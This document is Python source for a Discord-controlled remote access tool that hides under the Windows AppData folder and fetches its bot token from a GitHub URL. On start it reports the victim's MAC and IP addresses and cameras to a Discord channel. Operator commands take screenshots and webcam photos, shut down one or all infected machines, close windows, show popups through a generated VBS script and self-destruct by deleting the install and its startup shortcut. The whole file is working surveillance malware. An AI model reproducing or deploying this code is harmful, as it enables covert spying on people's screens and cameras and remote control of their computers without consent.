import nextcord
from nextcord.ext import commands
from nextcord import Interaction
import os
import pyautogui
from nextcord import File
import time
from PIL import Image
import keyboard
import subprocess
import string
import random
import asyncio
import shutil
import datetime
import socket
from datetime import datetime
import win32gui
import win32con
import win32api
import time
import os
import pyautogui
import uuid
import cv2
import webbrowser
import requests
import sys
import win32gui, win32con
from PIL import Image
from typing import Optional

def get_open_windows():
    windows = {}

    def enum_windows_callback(hwnd, _):
        if win32gui.IsWindowVisible(hwnd):
            window_text = win32gui.GetWindowText(hwnd)
            if window_text:
                windows[hwnd] = window_text

    win32gui.EnumWindows(enum_windows_callback, None)
    return windows

def close_window(hwnd):
    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)

def check_connected_cameras():

    camera_indices = range(10)
    connected_cameras = []

    for index in camera_indices:
        cap = cv2.VideoCapture(index)
        
        if cap.isOpened():
            connected_cameras.append(index)
            cap.release()

    return connected_cameras



def get_ipv6_address():
    hostname = socket.gethostname()
    
    addr_info = socket.getaddrinfo(hostname, None, socket.AF_INET6)
    
    for addr in addr_info:
        ipv6_address = addr[4][0]
        return ipv6_address
    
def get_device_ip4():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address



def get_device_ip():
    mac = hex(uuid.getnode()).replace('0x', '').upper()
    return ':'.join(mac[i:i+2] for i in range(0, 12, 2))

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
os.makedirs(target_path, exist_ok=True)

pyautogui.FAILSAFE = False

path_to_cursor = os.path.join(target_path, 'skibidi-mainmain', 'cursor', 'cursor.png')
cursor_image = Image.open(path_to_cursor)
cursor_width, cursor_height = 16, 16



client = commands.Bot(command_prefix = '!', intents=nextcord.Intents.default())

intents = nextcord.Intents.default()
intents.message_content = True


@client.event
async def on_ready():
    ip = get_device_ip()
    global_online_channel_id = 1336044356704145408
    global_update_channel_id = 1337769661466415136
    channel12 = client.get_channel(global_online_channel_id)
    channel13 = client.get_channel(global_update_channel_id)
    for guild in client.guilds:
        existing_category = nextcord.utils.get(guild.categories, name=str(ip))
        
        if not existing_category:
            await channel12.send("New client added to network, info:")
            category = await guild.create_category(str(ip))
            ipv6 = get_ipv6_address()
            ipv4 = get_device_ip4()

            cameras = check_connected_cameras()
            if cameras:
                pass
            else:
                cameras = "No cameras found."
            await channel12.send(f"Mac address:{ip}")
            await channel12.send(f"Ipv6: {ipv6}")
            await channel12.send(f"Ipv4: {ipv4}")
            if not cameras == "No cameras found.":
                await channel12.send("Cameras: at least one found!")
            else:
                await channel12.send("Cameras: no cameras found.")
            await channel12.send("@everyone")
            
            await guild.create_text_channel("info", category=category)
            channel = nextcord.utils.get(category.text_channels, name="info")
            await channel.send(f"IPv6: {ipv6}")
            await channel.send(f"IPv4: {ipv4}")
            await channel.send(f"Cameras: {cameras}")
            await guild.create_text_channel("events", category=category)
            await guild.create_text_channel("commands", category=category)
        if existing_category:
            user_profile = os.environ['USERPROFILE']
            target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
            if os.path.exists(os.path.join(target_path, "skibidi-mainmain", "update.txt")):
                with open(os.path.join(target_path, "skibidi-mainmain", "update.txt")) as up:
                    tex = up.read()
                    print("Checking if update was done...")
                    up.close()
                if not tex == "":
                    print("Updated!")
                    category = nextcord.utils.get(guild.categories, name=str(ip))
                    channel5 = nextcord.utils.get(category.text_channels, name="events")
                    await channel5.send(f"Client updated to version v{tex}")
                    await channel13.send(f"Client {ip} updated to version v{tex}! Use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
                    with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as up:
                        up.write("")
                        up.close()
                    with open(os.path.join(target_path, "skibidi-mainmain", "ver.txt"), "w") as up2:
                        up2.write(tex)
                        up2.close()
            await channel12.send(f"Client {ip} online! Use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
            category = nextcord.utils.get(guild.categories, name=str(ip))
            if category:
                embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d)
                embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
                channel = nextcord.utils.get(category.text_channels, name="events")
                if channel:
                    await channel.send(embed=embed)
    
    print(f'Bot is ready and connected to {len(client.guilds)} guild(s).')



ip = get_device_ip()
testServerId = [1139988299386195981]
with open(os.path.join(target_path, "skibidi-mainmain", "update.txt")) as ver9:
    ver8 = ver9.read()
    ver9.close()



@client.slash_command(guild_ids=testServerId, description="Shuts down the client's computer.")
async def shutdown(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        user_id = interaction.user.id
        await interaction.response.send_message("Taking screenshot before shutdown...")
        screenshot = pyautogui.screenshot()
        x, y = pyautogui.position()
        final_x = x - cursor_width // 2
        final_y = y - cursor_height // 2
        paste_position = (final_x, final_y)
        screenshot.paste(cursor_image, paste_position, cursor_image)
        screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
        file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
        embed = nextcord.Embed(description="Status before shutdown", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
        embed.set_author(name="Remote Control Bot")
        embed.set_image(url=f"attachment://status.png")
        embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")

        await interaction.send(embed=embed, file=file)
        os.system("shutdown /s /t 1")

@client.slash_command(guild_ids=testServerId, description="Shuts down all clients")
async def shutdown_all(interaction : Interaction):
    category = interaction.channel.category
    user_id = interaction.user.id

    await interaction.response.send_message("Taking screenshot before shutdown...")
    screenshot = pyautogui.screenshot()
    x, y = pyautogui.position()
    final_x = x - cursor_width // 2
    final_y = y - cursor_height // 2
    paste_position = (final_x, final_y)
    screenshot.paste(cursor_image, paste_position, cursor_image)
    screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
    file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
    embed = nextcord.Embed(description="Status before shutdown", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
    embed.set_author(name="Remote Control Bot")
    embed.set_image(url=f"attachment://status.png")
    embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")

    await interaction.send(embed=embed, file=file)
    os.system("shutdown /s /t 1")

@client.slash_command(guild_ids=testServerId, description="Sends a screenshot of the client's view.")
async def status(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        
        user_id = interaction.user.id
        await interaction.response.send_message("Taking screenshot...")
        screenshot = pyautogui.screenshot()
        x, y = pyautogui.position()
        final_x = x - cursor_width // 2
        final_y = y - cursor_height // 2
        paste_position = (final_x, final_y)
        screenshot.paste(cursor_image, paste_position, cursor_image)
        screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
        file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
        embed = nextcord.Embed(description="Status", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
        embed.set_author(name="Remote Control Bot")
        embed.set_image(url=f"attachment://status.png")
        embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")

        await interaction.send(embed=embed, file=file)

@client.slash_command(guild_ids=testServerId, description="Sends a picture off of the client's camera.")
async def take_picture(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        
        user_id = interaction.user.id
        await interaction.response.send_message("Taking picture...")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await interaction.edit_original_message(content="No camera found, failed to take picture.")
        else:
            ret, frame = cap.read()
            if not ret:
                await interaction.edit_original_message(content="Failed to grab frame.")
                cap.release()
            else:
                cv2.imwrite('captured_image.jpg', frame)
                cap.release()

                file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'captured_image.png'), filename='captured_image.png')
                embed = nextcord.Embed(description="Image", title="Captured image:", timestamp=datetime.now(), colour=0xb400f5)
                embed.set_author(name="Remote Control Bot")
                embed.set_image(url=f"attachment://captured_image.png")
                embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")

                await interaction.send(embed=embed, file=file)
                await interaction.delete_original_message()

@client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
async def self_destruct(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        
        user_id = interaction.user.id
        await interaction.response.send_message("Self-destructing client...")
        await interaction.edit_original_message(content="Client most likely self destructed!")
        script_content = """
import shutil
import os
from pathlib import Path
import time
import sys

time.sleep(1)

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
shutil.rmtree(os.path.join(target_path, "skibidi-startup"))
shutil.rmtree(os.path.join(target_path, "skibidi-mainmain"))
startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
shortcut_name="MyPythonScript"
shortcut_path = startup_dir / f"{shortcut_name}.lnk"
os.remove(shortcut_path)
sys.exit(0)
"""

        script_file = "self-destruct.py"
        user_profile = os.environ['USERPROFILE']
        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
        with open(os.path.join(target_path, script_file), "w") as file:
            file.write(script_content)
        subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
        sys.exit(0)

@client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
async def self_destruct_all(interaction : Interaction):
    user_id = interaction.user.id
    await interaction.response.send_message("Self-destructing all clients...")
    await interaction.edit_original_message(content="Clients most likely self destructed!")
    script_content = """
import shutil
import os
from pathlib import Path
import time
import sys

time.sleep(1)

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
shutil.rmtree(os.path.join(target_path, "skibidi-startup"))
shutil.rmtree(os.path.join(target_path, "skibidi-mainmain"))
startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
shortcut_name="MyPythonScript"
shortcut_path = startup_dir / f"{shortcut_name}.lnk"
os.remove(shortcut_path)
sys.exit(0)
"""

    script_file = "self-destruct.py"
    user_profile = os.environ['USERPROFILE']
    target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
    with open(os.path.join(target_path, script_file), "w") as file:
        file.write(script_content)
    subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
    sys.exit(0)
    
@client.slash_command(guild_ids=testServerId, description="Closes the window selected.")
async def close_all_windows(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        user_id = interaction.user.id

        def enum_windows_callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd):
                windows.append(hwnd)
        

        windows = []
        win32gui.EnumWindows(enum_windows_callback, windows)

        for hwnd in windows:
            try:
                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            except Exception as e:
                print(f"Could not close window {hwnd}: {e}")

@client.slash_command(guild_ids=testServerId, description="Select a window to close on client's computer.")
async def close_selected_window(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        windows = get_open_windows()

        if not windows:
            await interaction.response.send_message(content="No open windows found.")
            return

        class WindowSelect(nextcord.ui.Select):
            def __init__(self):
                options = [
                    nextcord.SelectOption(label=title[:100], value=str(hwnd))
                    for hwnd, title in windows.items()
                ]
                super().__init__(placeholder="Select a window to close", options=options)

            async def callback(self, select_interaction: Interaction):
                selected_hwnd = int(self.values[0])
                close_window(selected_hwnd)

                await interaction.delete_original_message()
                await select_interaction.response.send_message(
                    content=f"Closed window: {windows[selected_hwnd]}"
                )

        class WindowView(nextcord.ui.View):
            def __init__(self):
                super().__init__()
                self.add_item(WindowSelect())

        await interaction.response.send_message("Select a window to close:", view=WindowView())

@client.slash_command(guild_ids=testServerId, description="Pops up a message on the client's screen.")
async def popup(interaction : Interaction, message: str, window_title: Optional[str], repeat: Optional[int]):
    category = interaction.channel.category
    if str(category) == str(ip):
        user_id = interaction.user.id
        fmsg = f"""X=MsgBox("{str(message)}",0+16,"{str(window_title)}")"""

        user_profile = os.environ['USERPROFILE']
        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')

        with open(os.path.join(target_path, "skibidi-mainmain", "popup", "popup.vbs"), "w") as po:
            if repeat is None or repeat == 0:
                repeat = 1
            for i in range(repeat):
                po.write(fmsg + "\n")
            po.close()

        subprocess.Popen(["wscript", os.path.join(target_path, "skibidi-mainmain", "popup", "popup.vbs")], shell=True)
        
        await interaction.response.send_message(f"Popup window succesfully opened with message: {message}")


r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
token = r.text
stripped_string = token[1:]
client.run(stripped_string)